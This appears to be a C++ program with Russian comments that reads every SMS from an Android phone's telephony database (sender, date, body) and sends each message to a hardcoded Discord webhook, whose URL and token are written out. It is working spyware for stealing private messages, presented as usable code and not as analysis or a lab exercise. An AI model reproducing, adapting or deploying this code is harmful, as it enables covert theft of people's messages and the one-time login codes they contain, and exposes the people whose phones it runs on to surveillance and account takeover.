#include <iostream>
#include <sqlite3.h>
#include <curl/curl.h>
#include <string>

// Функция для отправки данных на Discord Webhook
void sendToDiscord(const std::string &webhook_url, const std::string &message) {
    CURL *curl;
    CURLcode res;

    // Инициализация libcurl
    curl = curl_easy_init();
    if(curl) {
        // Корректное экранирование для символов в JSON
        std::string escaped_message = message;
        size_t pos = 0;
        while ((pos = escaped_message.find("\"", pos)) != std::string::npos) {
            escaped_message.replace(pos, 1, "\\\"");
            pos += 2;
        }

        // Формируем JSON-данные для отправки
        std::string json_payload = "{\"content\": \"" + escaped_message + "\"}";

        std::cout << "Отправка JSON: " << json_payload << std::endl;  // Отладка для проверки JSON

        // Установка URL и параметров запроса
        curl_easy_setopt(curl, CURLOPT_URL, webhook_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload.c_str());
        
        // Устанавливаем заголовок Content-Type для передачи JSON
        struct curl_slist *headers = nullptr;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Выполнение запроса
        res = curl_easy_perform(curl);

        // Проверка на ошибки
        if(res != CURLE_OK)
            std::cerr << "Ошибка при отправке: " << curl_easy_strerror(res) << std::endl;

        // Очистка
        curl_easy_cleanup(curl);
        curl_slist_free_all(headers);
    }
}

int main() {
    sqlite3 *db;
    sqlite3_stmt *stmt;
    const char *dbPath = "/data/data/com.android.providers.telephony/databases/mmssms.db";
    int rc;

    // Webhook URL Discord сервера
    std::string webhook_url = "https://discord.com/api/webhooks/1255216776124301322/MVkUYu0hvmETp1MhcFSTC4AvZ3WMQDKxzu2UX4MiSRpz4SXoOzZE04vqB9dR27KU8wHv"; // Замените на ваш URL вебхука

    // Открываем базу данных
    rc = sqlite3_open(dbPath, &db);
    if (rc != SQLITE_OK) {
        std::cerr << "Не удалось открыть базу данных: " << sqlite3_errmsg(db) << std::endl;
        return rc;
    }

    // SQL-запрос для получения SMS
    const char *sql = "SELECT address, date, body FROM sms";

    // Подготовка SQL-запроса
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);
    if (rc != SQLITE_OK) {
        std::cerr << "Ошибка при подготовке SQL-запроса: " << sqlite3_errmsg(db) << std::endl;
        sqlite3_close(db);
        return rc;
    }

    // Выполнение запроса и отправка данных на Discord
    while (sqlite3_step(stmt) == SQLITE_ROW) {
        std::string address = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 0));
        std::string date = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 1));
        std::string body = reinterpret_cast<const char*>(sqlite3_column_text(stmt, 2));

        // Формируем сообщение
        std::string message = "Номер: " + address + "\\nДата: " + date + "\\nСообщение: " + body;

        // Отправляем сообщение на Discord
        sendToDiscord(webhook_url, message);
    }

    // Закрытие базы данных
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    return 0;
}